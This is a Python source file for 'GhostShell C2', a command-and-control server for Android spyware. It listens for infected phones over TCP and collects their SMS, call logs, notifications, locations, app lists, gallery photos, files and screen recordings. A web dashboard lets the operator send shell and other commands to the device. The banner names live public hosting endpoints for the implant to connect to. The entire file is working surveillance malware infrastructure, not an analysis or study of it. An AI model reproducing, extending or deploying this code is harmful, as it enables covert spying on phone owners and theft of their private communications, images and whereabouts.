#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import json
import threading
import base64
from datetime import datetime
import time
import logging
import sys
import os
from colorama import init, Fore, Style
import signal
from flask import Flask, render_template, jsonify, request, send_file, send_from_directory
from flask_socketio import SocketIO, emit
import io

# --- Railway Configuration ---
HTTP_PORT = int(os.environ.get('PORT', 8080))  # Railway HTTP port
TCP_PORT = 9090  # Port untuk Android TCP connection (INTERNAL)
HOST = '0.0.0.0'

# --- Globals ---
client_socket = None
client_address = None
running = True
in_shell_mode = False
in_notification_mode = False
in_gallery_mode = False
device_current_dir = "/"
device_info = {}
connected_devices = {}
gallery_images = {}
device_commands = {}
command_history = []
notification_history = []
sms_history = []
call_history = []
start_time = time.time()

# --- Flask Setup ---
app = Flask(__name__, 
            static_folder='static', 
            template_folder='templates')
app.config['SECRET_KEY'] = 'ghostshell-railway-secret'
app.config['TEMPLATES_AUTO_RELOAD'] = True
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading', logger=False, engineio_logger=False)

# --- Setup ---
init(autoreset=True)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Buat direktori yang diperlukan
for dir_name in ['captured_images', 'device_downloads', 'screen_recordings', 'gallery_downloads', 'templates']:
    if not os.path.exists(dir_name):
        os.makedirs(dir_name)

# Copy index.html ke templates jika ada
if os.path.exists('index.html'):
    import shutil
    shutil.copy('index.html', 'templates/index.html')
    print(f"{Fore.GREEN}[✓] index.html copied to templates folder{Style.RESET_ALL}")

# =============== FUNGSI TCP SERVER ===============

def handle_incoming_data(data):
    """Handle incoming data dari Android device"""
    global in_shell_mode, in_notification_mode, in_gallery_mode, device_current_dir, device_info
    
    try:
        payload = json.loads(data).get('data', {})
        log_type = payload.get('type', 'UNKNOWN')

        # Log ke console
        print(f"{Fore.CYAN}[{log_type}] {Fore.WHITE}{payload}")

        # Handle berdasarkan tipe
        if log_type == 'DEVICE_INFO':
            device_info = payload.get('info', {})
            socketio.emit('device_info', device_info)
            
        elif log_type == 'SMS_LOG':
            sms = payload.get('log', {})
            sms_history.append(sms)
            socketio.emit('sms_received', sms)
            
        elif log_type == 'CALL_LOG':
            call = payload.get('log', {})
            call_history.append(call)
            socketio.emit('call_received', call)
            
        elif log_type == 'NOTIFICATION_DATA':
            notif = payload.get('notification', {})
            notification_history.append(notif)
            socketio.emit('notification', notif)
            
        elif log_type == 'IMAGE_DATA':
            image = payload.get('image', {})
            filename = image.get('filename', f"image_{int(time.time())}.jpg")
            image_data = base64.b64decode(image.get('image_base64', ''))
            
            # Simpan image
            filepath = os.path.join('captured_images', filename)
            with open(filepath, 'wb') as f:
                f.write(image_data)
            
            socketio.emit('image_received', {'filename': filename, 'path': filepath})
            
        elif log_type == 'LOCATION_SUCCESS':
            url = payload.get('url', '')
            socketio.emit('location', {'url': url, 'status': 'success'})
            
        elif log_type == 'LOCATION_FAIL':
            error = payload.get('error', 'Unknown error')
            socketio.emit('location', {'error': error, 'status': 'failed'})
            
        elif log_type == 'APP_LIST':
            apps = payload.get('apps', [])
            socketio.emit('app_list', {'apps': apps, 'count': len(apps)})
            
        elif log_type == 'FILE_MANAGER_RESULT':
            files = payload.get('files', [])
            socketio.emit('file_list', {'files': files, 'path': payload.get('path', '/')})
            
        elif log_type == 'SHELL_MODE_STARTED':
            in_shell_mode = True
            device_current_dir = payload.get("current_dir", "/")
            socketio.emit('mode_change', {'mode': 'shell', 'status': 'started', 'dir': device_current_dir})
            
        elif log_type == 'SHELL_MODE_ENDED':
            in_shell_mode = False
            socketio.emit('mode_change', {'mode': 'shell', 'status': 'ended'})
            
        elif log_type == 'NOTIFICATION_MODE_STARTED':
            in_notification_mode = True
            socketio.emit('mode_change', {'mode': 'notification', 'status': 'started'})
            
        elif log_type == 'NOTIFICATION_MODE_ENDED':
            in_notification_mode = False
            socketio.emit('mode_change', {'mode': 'notification', 'status': 'ended'})
            
        elif log_type == 'GALLERY_MODE_STARTED':
            in_gallery_mode = True
            socketio.emit('mode_change', {'mode': 'gallery', 'status': 'started'})
            
        elif log_type == 'GALLERY_MODE_ENDED':
            in_gallery_mode = False
            socketio.emit('mode_change', {'mode': 'gallery', 'status': 'ended'})
            
        elif log_type == 'GALLERY_PAGE_DATA':
            files = payload.get('files', [])
            page = payload.get('page', 1)
            total_pages = payload.get('total_pages', 1)
            socketio.emit('gallery_page', {
                'files': files, 
                'page': page, 
                'total_pages': total_pages
            })
            
        elif log_type == 'GALLERY_IMAGE_CHUNK':
            chunk_data = payload.get('chunk_data', {})
            filename = chunk_data.get('filename', 'gallery_image.jpg')
            chunk = base64.b64decode(chunk_data.get('chunk', ''))
            
            # Simpan chunk
            filepath = os.path.join('gallery_downloads', filename)
            mode = 'ab' if os.path.exists(filepath) else 'wb'
            with open(filepath, mode) as f:
                f.write(chunk)
            
            if chunk_data.get('is_last', False):
                socketio.emit('gallery_image_complete', {'filename': filename, 'path': filepath})
            
        elif log_type == 'GET_FILE_CHUNK':
            chunk_data = payload.get('chunk_data', {})
            filename = chunk_data.get('filename', 'downloaded_file')
            chunk = base64.b64decode(chunk_data.get('chunk', ''))
            
            filepath = os.path.join('device_downloads', filename)
            mode = 'ab' if os.path.exists(filepath) else 'wb'
            with open(filepath, mode) as f:
                f.write(chunk)
            
            if chunk_data.get('is_last', False):
                socketio.emit('file_download_complete', {'filename': filename, 'path': filepath})
            
        elif log_type == 'SCREEN_RECORDER_STARTED':
            socketio.emit('recording_status', {'status': 'started'})
            
        elif log_type == 'SCREEN_RECORDER_STOPPED':
            socketio.emit('recording_status', {'status': 'stopped', 'message': 'Receiving recording...'})
            
        elif log_type == 'SHELL_LS_RESULT':
            files = payload.get('files', [])
            socketio.emit('shell_ls', {'files': files, 'dir': device_current_dir})
            
        elif log_type == 'SHELL_CD_SUCCESS':
            device_current_dir = payload.get("current_dir", device_current_dir)
            socketio.emit('shell_cd', {'dir': device_current_dir})
            
        elif log_type in ['GET_FILE_END', 'GALLERY_IMAGE_END']:
            filename = payload.get('file', 'unknown')
            socketio.emit('file_saved', {'filename': filename})
            
        else:
            # Unknown type, just forward
            socketio.emit('unknown_data', {'type': log_type, 'data': payload})

    except json.JSONDecodeError:
        print(f"{Fore.RED}[ERROR] Invalid JSON: {data[:200]}")
    except Exception as e:
        print(f"{Fore.RED}[ERROR] {e}")

def handle_tcp_client(conn, addr):
    """Handle TCP client connection dari Android"""
    global client_socket, client_address, in_shell_mode, in_notification_mode, in_gallery_mode
    
    client_socket = conn
    client_address = addr
    
    # Notify web clients
    socketio.emit('device_connected', {
        'ip': addr[0],
        'port': addr[1],
        'time': datetime.now().isoformat()
    })
    
    print(f"\n{Fore.GREEN}[+] Device connected from {addr[0]}:{addr[1]}")
    
    buffer = ""
    conn.settimeout(30.0)
    
    while running and client_socket:
        try:
            data = conn.recv(16384).decode('utf-8', errors='ignore')
            if not data:
                break
                
            buffer += data
            while '\n' in buffer:
                line, buffer = buffer.split('\n', 1)
                if line.strip():
                    handle_incoming_data(line.strip())
                    
        except socket.timeout:
            # Kirim heartbeat check
            try:
                conn.send(b"ping\n")
            except:
                break
            continue
        except ConnectionResetError:
            break
        except Exception as e:
            print(f"{Fore.RED}[!] TCP error: {e}")
            break
    
    print(f"{Fore.RED}[-] Device disconnected")
    client_socket = None
    in_shell_mode = False
    in_notification_mode = False
    in_gallery_mode = False
    
    socketio.emit('device_disconnected')

def tcp_server():
    """Jalankan TCP server untuk Android connection"""
    tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tcp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    tcp_socket.bind((HOST, TCP_PORT))
    tcp_socket.listen(5)
    
    print(f"{Fore.GREEN}[TCP] Listening on {HOST}:{TCP_PORT}")
    
    while running:
        try:
            tcp_socket.settimeout(1.0)
            conn, addr = tcp_socket.accept()
            conn.settimeout(30.0)
            
            # Handle client di thread terpisah
            threading.Thread(target=handle_tcp_client, args=(conn, addr), daemon=True).start()
            
        except socket.timeout:
            continue
        except Exception as e:
            print(f"{Fore.RED}[TCP] Error: {e}")
            break
    
    tcp_socket.close()

# =============== FLASK ROUTES ===============

@app.route('/')
def index():
    """Serve index.html"""
    return render_template('index.html')

@app.route('/api/status')
def api_status():
    """API untuk mendapatkan status server"""
    return jsonify({
        'device_connected': client_socket is not None,
        'device_ip': client_address[0] if client_address else None,
        'device_port': client_address[1] if client_address else None,
        'device_info': device_info,
        'commands': len(command_history),
        'notifications': len(notification_history),
        'sms': len(sms_history),
        'calls': len(call_history),
        'images': len([f for f in os.listdir('captured_images') if f.endswith('.jpg')]) if os.path.exists('captured_images') else 0,
        'uptime': int(time.time() - start_time),
        'in_shell_mode': in_shell_mode,
        'in_notification_mode': in_notification_mode,
        'in_gallery_mode': in_gallery_mode,
        'current_dir': device_current_dir
    })

@app.route('/api/history')
def api_history():
    """API untuk mendapatkan history"""
    return jsonify({
        'commands': command_history[-50:],
        'notifications': notification_history[-50:],
        'sms': sms_history[-50:],
        'calls': call_history[-50:]
    })

@app.route('/api/send_command', methods=['POST'])
def api_send_command():
    """API untuk mengirim command ke device"""
    global in_notification_mode, in_shell_mode, in_gallery_mode
    
    if not client_socket:
        return jsonify({'success': False, 'error': 'No device connected'})
    
    data = request.json
    command = data.get('command', '').strip()
    
    if not command:
        return jsonify({'success': False, 'error': 'Empty command'})
    
    # Log command
    command_history.append({
        'command': command,
        'time': datetime.now().isoformat(),
        'status': 'sent'
    })
    
    # Handle special commands
    if command == 'exit_shell' and in_shell_mode:
        client_socket.sendall(b"exit\n")
        in_shell_mode = False
    elif command == 'exit_notification' and in_notification_mode:
        client_socket.sendall(b"exit\n")
        in_notification_mode = False
    elif command == 'exit_gallery' and in_gallery_mode:
        client_socket.sendall(b"exit\n")
        in_gallery_mode = False
    else:
        # Send command to device
        client_socket.sendall(f"{command}\n".encode())
    
    # Broadcast to all web clients
    socketio.emit('command_sent', {
        'command': command,
        'time': datetime.now().isoformat()
    })
    
    return jsonify({'success': True})

@app.route('/api/files/<path:filename>')
def download_file(filename):
    """Download file dari server"""
    return send_from_directory('device_downloads', filename, as_attachment=True)

@app.route('/api/images/<path:filename>')
def get_image(filename):
    """Get captured image"""
    return send_from_directory('captured_images', filename)

# =============== SOCKET.IO EVENTS ===============

@socketio.on('connect')
def handle_web_connect():
    """Web client connected"""
    emit('connected', {
        'status': 'connected',
        'time': datetime.now().isoformat()
    })

@socketio.on('disconnect')
def handle_web_disconnect():
    """Web client disconnected"""
    pass

@socketio.on('web_get_status')
def handle_web_get_status():
    """Web client requests status"""
    emit('status_update', {
        'device_connected': client_socket is not None,
        'device_ip': client_address[0] if client_address else None,
        'in_shell_mode': in_shell_mode,
        'in_notification_mode': in_notification_mode,
        'in_gallery_mode': in_gallery_mode,
        'current_dir': device_current_dir
    })

# =============== MAIN ===============

if __name__ == '__main__':
    print(Fore.CYAN + """
╔═══════════════════════════════════════════════════════════════╗
║   ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗███████╗██╗     ║
║  ██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝██╔════╝██║     ║
║  ██║  ███╗███████║██║   ██║███████╗   ██║   █████╗  ██║     ║
║  ██║   ██║██╔══██║██║   ██║╚════██║   ██║   ██╔══╝  ██║     ║
║  ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║   ███████╗███████╗║
║   ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝╚══════╝║
║                                                               ║
║                    ██████╗██████╗                           ║
║                   ██╔════╝╚════██╗                          ║
║                   ██║      █████╔╝                          ║
║                   ██║     ██╔═══╝                           ║
║                   ╚██████╗███████╗                          ║
║                    ╚═════╝╚══════╝                          ║
╚═══════════════════════════════════════════════════════════════╝
    """ + Style.RESET_ALL)
    
    print("-" * 60)
    print("      GHOSTSHELL C2 - RAILWAY EDITION")
    print("-" * 60)
    print(f"[*] HTTP Server (Web Dashboard):")
    print(f"    - Internal : http://{HOST}:{HTTP_PORT}")
    print(f"    - Public   : https://web-production-aa67.up.railway.app")
    print("-" * 60)
    print(f"[*] TCP Server (Android Connection):")
    print(f"    - Internal : {HOST}:{TCP_PORT}")
    print(f"    - Public   : mainline.proxy.rlwy.net:37745")
    print("-" * 60)
    print("[*] Android Config HARUS:")
    print(f"    SERVER_IP = \"mainline.proxy.rlwy.net\"")
    print(f"    SERVER_PORT = 37745")
    print("-" * 60)
    print("[*] Starting servers...\n")
    
    # Jalankan TCP server di thread terpisah
    tcp_thread = threading.Thread(target=tcp_server, daemon=True)
    tcp_thread.start()
    
    # Jalankan Flask HTTP server dengan Python langsung
    try:
        socketio.run(app, host=HOST, port=HTTP_PORT, debug=False, allow_unsafe_werkzeug=True)
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Server stopped by user{Style.RESET_ALL}")
        running = False
        sys.exit(0)
